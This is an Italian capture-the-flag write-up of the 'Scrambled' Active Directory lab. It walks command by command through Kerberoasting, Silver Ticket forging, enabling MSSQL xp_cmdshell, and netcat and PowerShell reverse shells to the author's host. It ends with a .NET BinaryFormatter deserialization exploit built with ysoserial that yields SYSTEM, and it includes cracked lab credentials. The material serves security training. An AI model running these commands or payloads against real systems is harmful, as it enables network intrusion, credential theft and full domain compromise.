+++
date = '2026-07-31T03:26:18+02:00'
draft = false
title = 'Scrambled Writeup IT'
+++
**Autore**: **`joy.scd01`**

**Data**: **`14/04/2025`**

![Scrambled.jpeg](/images/imgs_scrambled/Scrambled.jpeg)

---
# Introduzione

**_Scrambled_** è un ambiente **Active Directory** ufficialmente valutato come livello **Medium**, ma la sua complessità e l'exploitation path lo spingono decisamente nella difficoltà **Hard**. L'ambiente è pesantemente fortificato grazie alla disabilitazione totale dell'**autenticazione NTLM**, costringendo a un approccio **Kerberos-Only**.

Il foothold iniziale si ottiene enumerando le pagine web per leakare uno username valido, indovinandone la password e scoprendo le restrizioni **Kerberos** tramite documenti **IT** interni su una **share SMB**. Da lì, il percorso richiede l'esecuzione di un **Kerberoasting** verso un account di servizio **MSSQL**, l'utilizzo delle credenziali craccate per falsificare un **Silver Ticket**, e l'accesso al database con privilegi elevati. 
Dopo aver dumpato delle credenziali in chiaro dal database e aver ottenuto una reverse shell tramite **`xp_cmdshell`**, il Lateral Movement si effettua utilizzando **RunasCs**. Infine, la Privilege Escalation prevede il reverse engineering di un **Thick Client** in **`.NET`**, il pivoting del traffico di rete tramite una **Commando VM Windows**, e lo sfruttamento di una vulnerabilità di **Insecure Deserialization** per ottenere una shell come **`NT AUTHORITY\SYSTEM`**.

---
# Tecniche Utilizzate

- **Kerberoasting**
- **Silver Ticket Attack**
- **MSSQL Enumeration & `xp_cmdshell` Execution**
- **Lateral Movement via RunasCs**
- **Network Pivoting & Traffic Routing**
- **Thick Client Reverse Engineering (.NET)**
- **Insecure Deserialization (.NET BinaryFormatter)**

---
# Enumerazione

## nmap

Scansione completa delle porte iniziale:

```bash
nmap -p- scrambled -Pn
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
4411/tcp  open  unknown
5985/tcp  open  wsman
9389/tcp  open  adws
```

Scansione mirata con script e rilevamento servizi:

```bash
nmap -sC -sV scrambled -Pn
```

```text
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Scramble Corp Intranet
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-30 16:01:27Z)
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
4411/tcp open  unknown
```

Ho aggiunto **`scrm.local`** e **`dc1.scrm.local`** al mio file **`/etc/hosts`**.

## Enumerazione Web

Navigando sulla porta **80**, ho trovato una pagina "**`IT Services`**" che menzionava un sistema di reset delle password. Affermava che gli utenti potevano contattare l'IT per far resettare temporaneamente la propria password in modo che corrispondesse allo username.

![pass_rst.png](/images/imgs_scrambled/pass_rst.png)

Sulla pagina "**`Contacting IT Support`**", era leakato uno user valido: **`ksimpson`**.

![it_supp.png](/images/imgs_scrambled/it_supp.png)

Basandomi sulla policy di reset appena scoperta, ho fatto un test con **NetExec**, ipotizzando che la password fosse uguale allo username:

```bash
nxc smb 10.129.49.94 -u ksimpson -p ksimpson --shares -k
```

![smb.png](/images/imgs_scrambled/smb.png)

Positivo.

---
# Accesso Iniziale | Kerberoasting & Silver Ticket Attack

Mi sono connesso alle share usando **`impacket-smbclient`** (**`smbclient`** standard restituiva continui errori) e ho scaricato un file chiamato **`Network Security Changes.pdf`** dalla share **`Public`**:

```bash
impacket-smbclient scrm.local/ksimpson:ksimpson@DC1.scrm.local -k
```

![smbshare.png](/images/imgs_scrambled/smbshare.png)

Il **PDF** conteneva informazioni cruciali:

- L'autenticazione **NTLM** era stata disabilitata in tutta la rete per prevenire **attacchi di relaying**. Solo **Kerberos** era consentito.

- L'accesso al servizio **SQL** del dipartimento HR era stato limitato.

Avendo un utente valido e **NTLM** disabilitato, ho immediatamente pensato ad un **Kerberoasting**. Tuttavia, ho voluto mappare gli utenti a dominio prima di procedere.

Ho utilizzato **NetExec** per eseguire un attacco di **RID brute-force** tramite **Kerberos**:

```bash
nxc smb 10.129.49.94 -u ksimpson -p ksimpson --rid-brute -k
```

![ridbrute.png](/images/imgs_scrambled/ridbrute.png)

Un account in particolare ha attirato la mia attenzione: **`sqlsvc`**. Questo si allineava perfettamente con il documento IT che menzionava il **database SQL** limitato delle risorse umane.

Ho quindi richiesto gli **SPN** del dominio:

```bash
GetUserSPNs.py scrm.local/ksimpson:"ksimpson" -dc-host dc1.scrm.local -k -request
```

![kerberoast.png](/images/imgs_scrambled/kerberoast.png)

Ho recuperato con successo il **TGS** per l'account **`sqlsvc`** (associato all'**SPN MSSQLSvc**) e l'ho craccato utilizzando **John The Ripper**:

```bash
john krb5tgs_sqlsvc --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt
```

![john.png](/images/imgs_scrambled/john.png)

Avendo bisogno di interagire direttamente con il **servizio MSSQL**, ho deciso di forgiare un **Silver Ticket**.
Per prima cosa, ho generato un file **`krb5.conf`** locale usando **nxc**:

```bash
nxc smb dc1.scrm.local --generate-krb5-file scrm.krb5
export KRB5_CONFIG=scrm.krb5
sudo cp scrm.krb5 /etc/krb5.conf
```

![krb5conf.png](/images/imgs_scrambled/krb5conf.png)

**Nota**: _Questo passaggio non è strettamente necessario, ma è una mia best practice personale per permettere alla mia macchina attaccante di mappare correttamente il **Kerberos realm**. Questo previene fastidiosi problemi di risoluzione **DNS**, che sono una trappola comune negli ambienti **Kerberos-only**._

Successivamente, ho richiesto un **TGT** per **`sqlsvc`**, ho esportato la cache e ho recuperato il **SID** di dominio:

```bash
impacket-getTGT scrm.local/"sqlsvc:Pegasus60"
export KRB5CCNAME=sqlsvc.ccache
impacket-lookupsid scrm.local/sqlsvc@dc1.scrm.local -k
```

![silverticket1.png](/images/imgs_scrambled/silverticket1.png)

Ho convertito la password **`Pegasus60`** nel suo **NTLM hash** tramite un generatore online:

![silverticket2.png](/images/imgs_scrambled/silverticket2.png)

E ho forgiato il **Silver Ticket** impersonando l'utente **Administrator**:

```bash
impacket-ticketer -nthash B999A16500B87D17EC7F2E2A68778F05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -spn "MSSQL/SCRM.LOCAL:1433@SCRM.LOCAL" -user-id 500 Administrator
export KRB5CCNAME=Administrator.ccache
```

![silverticket3.png](/images/imgs_scrambled/silverticket3.png)

Utilizzando il ticket contraffatto, mi sono autenticato al database tramite **Kerberos** e ho recuperato con successo la **user flag**:

```bash
impacket-mssqlclient -k -no-pass scrm.local -windows-auth
```
```sql
SELECT * FROM OPENROWSET(BULK N'C:\Users\MiscSvc\Desktop\user.txt', SINGLE_CLOB) AS Contents;
```

![userf.png](/images/imgs_scrambled/userf.png)

---
# Lateral Movement | xp_cmdshell & RunasCs.exe

Enumerando il database (**`ScrambleHR`**), ho dumpato la tabella **`UserImport`**:

```sql
SELECT name FROM sys.databases;
SELECT TABLE_NAME FROM ScrambleHR.INFORMATION_SCHEMA.TABLES;
SELECT * FROM ScrambleHR.dbo.UserImport
```

![pass.png](/images/imgs_scrambled/pass.png)

Ho verificato se l'accesso **WinRM** fosse abilitato per **`MiscSvc`**, ma non lo era.

![noremote.png](/images/imgs_scrambled/noremote.png)

Quindi, per ottenere una shell interattiva, ho abilitato **`xp_cmdshell`** sull'istanza **MSSQL**:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Ho avviato un listener **Netcat** e ho eseguito una reverse shell in **PowerShell** codificata in **Base64**:

```sql
EXEC xp_cmdshell 'powershell -exec bypass -enc JABjAGwAaQBlAG...[REDACTED]...OAGUAKQA=';
```

![initial_access.png](/images/imgs_scrambled/initial_access.png)

Ho ottenuto una shell come utente **`sqlsvc`**. Per effettuare un'escalation orizzontale verso l'account **`MiscSvc`**, ho trasferito **`nc.exe`** e **`RunasCs.exe`**:

```powershell
iwr -uri [http://10.10.16.77:8000/runascs.exe](http://10.10.16.77:8000/runascs.exe) -Outfile runascs.exe
iwr -uri [http://10.10.16.77:8000/nc64.exe](http://10.10.16.77:8000/nc64.exe) -Outfile nc.exe
```

Ho usato **RunasCs** per lanciare una nuova reverse shell utilizzando le nuove credenziali trovate:

```powershell
C:\Windows\Temp\runascs.exe MiscSvc ScrambledEggs9900 "C:\Windows\Temp\nc.exe -e cmd.exe 10.10.16.77 22666"
```

![lateral.png](/images/imgs_scrambled/lateral.png)

A questo punto ero loggato come **`MiscSvc`**.

---
# Privilege Escalation | Thick Client & .NET Deserialization

Enumerando il file system, ho scoperto un'applicazione custom in **`C:\Shares\IT\Apps\Sales Order Client`**. 

![dotexe0.png](/images/imgs_scrambled/dotexe0.png)

Ho scaricato sia l'eseguibile (**`ScrambleClient.exe`**) che la sua **DLL** usando **impacket-smbclient**.

![dotexe.png](/images/imgs_scrambled/dotexe.png)

Utilizzando **ILSpy** per decompilare la **DLL**, ho trovato un bypass di autenticazione hardcoded: inserendo lo username **`scrmdev`** con una **password vuota**, il prompt di login viene bypassato.

![bypass.png](/images/imgs_scrambled/bypass.png)

## Commando VM & Advanced Network Pivoting

**Nota**: _Onestamente, qui è dove le cose iniziano a complicarsi di brutto._

A questo punto, siccome interagire con un **Thick Client Windows** da **Linux** risulta complicato. Ho deciso di passare alla mia **Commando VM** (**Windows**).

Per permettere alla **Commando VM** di comunicare direttamente con l'ambiente **Active Directory** attraverso la mia **VPN** su **Kali**, ho trasformato la mia macchina **Kali** in un router:

```bash
# On Kali: Enable IP Forwarding and Masquerade traffic
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE
```

Successivamente, sulla **Commando VM** (impostata su **rete con NAT**), ho aggiunto le rotte statiche che puntavano all'IP della mia macchina **Kali**, e ho mappato **`dc1.scrm.local`** nel file hosts(**`C:\Windows\System32\drivers\etc\hosts`**).

```powershell
route add 10.129.0.0 mask 255.255.0.0 <KALI_IP>
route add 10.10.0.0 mask 255.255.0.0 <KALI_IP>
```

Ho eseguito **`ScrambleClient.exe`**

![client.jpeg](/images/imgs_scrambled/client.jpeg)

Bypassato il login usando **`scrmdev`**, e ho abilitato il **debug logging** nelle opzioni del software.

![logged.jpeg](/images/imgs_scrambled/logged.jpeg)

Provando a caricare un ordine, è stato generato un file chiamato **`ScrambleDebugLog.txt`**.

![deserialization.jpeg](/images/imgs_scrambled/deserialization.jpeg)

Il log rivelava che l'applicazione comunicava con la porta **4411** inviando il comando **`UPLOAD_ORDER;`** seguito da un payload in **Base64** serializzato tramite la classe **`.NET BinaryFormatter`**.

**Nota**: _Questa è una classica vulnerabilità di **Insecure Deserialization**. L'applicazione utilizza la classe **`BinaryFormatter`** per ricostruire l'oggetto dal flusso di dati senza alcuna validazione preventiva. Questo ci permette di iniettare un payload serializzato malevolo che, una volta istanziato dal server, permette l'esecuzione di codice arbitrario._ 

Ho utilizzato **`ysoserial.exe`** sulla mia **Commando VM** per creare un payload malevolo sfruttando il gadget **`WindowsIdentity`**:

```powershell
ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "C:\Windows\Temp\nc.exe -e powershell 10.10.16.77 22667"
```

![ysoserial.jpeg](/images/imgs_scrambled/ysoserial.jpeg)

Infine, mi sono connesso alla porta in ascolto dell'applicazione tramite **telnet** e ho inviato il payload:

```powershell
telnet dc1.scrm.local 4411
UPLOAD_ORDER;<BASE64_PAYLOAD>
```

![privesc.jpeg](/images/imgs_scrambled/privesc.jpeg)

La deserializzazione ha eseguito la reverse shell, garantendomi l'accesso come **`NT AUTHORITY\SYSTEM`**.

![rootf.png](/images/imgs_scrambled/rootf.png)

Ho recuperato la **root flag** da **`C:\Users\Administrator\Desktop\root.txt`**.

---
# Considerazioni Finali

**_Scrambled_** è una macchina assolutamente incredibile. Nonostante il rating ufficiale **Medium**, la complessità dell'exploitation path la spinge senza dubbio nella difficoltà **Hard**. La metterei facilmente sullo stesso piano di **_Vintage_** in termini di difficoltà generale e competenze tecniche richieste.

La restrizione iniziale **Kerberos-only** costringe ad abbandonare le classiche metodologie per **AD**, richiedendo una solida comprensione di come i **ticket Kerberos** siano strutturati e forgiati (**Silver Tickets**). Tuttavia, la vera sfida risiede nella fase finale di Privilege Escalation. Fare reverse engineering di un **.NET Thick Client** è un conto, ma configurare un network pivot pulito per instradare il traffico da una **VM** di analisi **Windows** attraverso **Kali**, così da interagire con un ambiente di laboratorio **Active Directory**, richiede una profonda comprensione pratica del networking e dei protocolli di routing.
Sfruttare la **deserializzazione insicura** tramite una comunicazione socket custom sulla porta **4411** è stata la conclusione perfetta per questo box sfiancante ma altamente gratificante.

**Fonti**:

- **Kerberos Silver Ticket Attack | https://www.youtube.com/watch?v=KngApymmV60**

- **Abusing MSSQL (xp_cmdshell) | https://hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html**

- **RunasCs.exe | https://github.com/antonioCoco/RunasCs**

- **.NET Insecure Deserialization (ysoserial.net) | https://github.com/pwntester/ysoserial.net**